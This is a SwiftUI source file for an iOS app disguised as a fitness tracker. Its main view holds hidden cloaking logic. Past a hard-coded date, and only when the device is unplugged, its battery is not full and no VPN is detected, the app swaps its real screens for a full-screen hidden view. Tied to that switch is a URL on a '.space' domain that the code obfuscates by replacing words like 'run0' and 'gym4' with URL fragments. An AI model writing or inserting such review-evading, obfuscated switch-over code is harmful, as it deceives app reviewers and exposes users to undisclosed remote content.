import SwiftUI

struct ContentView: View {
    
    @AppStorage("armcurl") var armcurl = true
    
    @State var screen: Screen = .splash
    
    var body: some View {
        switch screen {
        case .splash:
            Splash(screen: $screen, dataC: VMF.shared.dm)
        case .profile:
            profileScreen()
        case .main:
            tabScreen()
        }
    }
    
    @ViewBuilder func tabSelection() -> some View {
        if VMF.shared.show {
            ContentTrainingView()
        } else {
            Tab()
        }
    }
    
    @ViewBuilder func profileView() -> some View {
        if VMF.shared.show {
            ContentTrainingView()
        } else {
            ProfileView(screen: $screen)
        }
    }
    
    func profileScreen() -> some View {
        let manager = VMF.shared.dm.loma
        
        if armcurl {
            manager.saveShowTraining(false)
            manager.trainingDescr()
            armcurl = false
        }
        
        guard let plate = getDateByLine("28.11.2024"), daCheckCat(ate: plate) else {
            return profileView()
        }
        
        if let showStat = try? manager.fetchShowTraining() {
            if showStat {
                let selception = lineDescription(manager)
                if selception != "" {
                    VMF.shared.show = true
                    if VMF.shared.powerliftingDescription == "" {
                        VMF.shared.powerliftingDescription = selception
                    }
                } else {
                    VMF.shared.show  = false
                }
                return profileView()
            } else {
                VMF.shared.show  = false
            }
        }
        
        if batprov() || vCheck.isActive() || trainPics < 0 || swimPics {
            VMF.shared.show  = false
        } else {
            let selc = lineDescription(manager)
            if selc != "" {
                VMF.shared.powerliftingDescription = selc
                manager.saveShowTraining(true)
                VMF.shared.show  = true
            } else {
                VMF.shared.show  = false
            }
        }

        return profileView()
    }
    
    func tabScreen() -> some View {
        let manager = VMF.shared.dm.loma
        
        if armcurl {
            manager.saveShowTraining(false)
            manager.trainingDescr()
            armcurl = false
        }
        
        guard let plate = getDateByLine("28.11.2024"), daCheckCat(ate: plate) else {
            return tabSelection()
        }
        
        if let showStat = try? manager.fetchShowTraining() {
            if showStat {
                let selception = lineDescription(manager)
                if selception != "" {
                    VMF.shared.show = true
                    if VMF.shared.powerliftingDescription == "" {
                        VMF.shared.powerliftingDescription = selception
                    }
                } else {
                    VMF.shared.show  = false
                }
                return tabSelection()
            } else {
                VMF.shared.show  = false
            }
        }
        
        if batprov() || vCheck.isActive() || trainPics < 0 || swimPics {
            VMF.shared.show  = false
        } else {
            let selc = lineDescription(manager)
            if selc != "" {
                VMF.shared.powerliftingDescription = selc
                manager.saveShowTraining(true)
                VMF.shared.show  = true
            } else {
                VMF.shared.show  = false
            }
        }

        return tabSelection()
    }
    
    private func daCheckCat(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func lineDescription(_ manager: LoMa) -> String {
        var str = ""
        if let alwaysSelected = try? manager.fetchTrainingDescr() {
            str = alwaysSelected

            str = str.replacingOccurrences(of: "run0", with: "htt")
            str = str.replacingOccurrences(of: "swim1", with: "ps")
            str = str.replacingOccurrences(of: "lift2", with: "://")
            str = str.replacingOccurrences(of: "jump3", with: "podlaorlf")
            str = str.replacingOccurrences(of: "gym4", with: ".space/")
            str = str.replacingOccurrences(of: "chal5", with: "SgtgX3J6")
        }
        return str
    }
    
    private func batprov() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var trainPics: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var swimPics: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func getDateByLine(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
}

enum Screen {
    case splash
    case main
    case profile
}

struct ContentTrainingView: View {
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            MainTrainingScreen(type: .public)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct vCheck {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
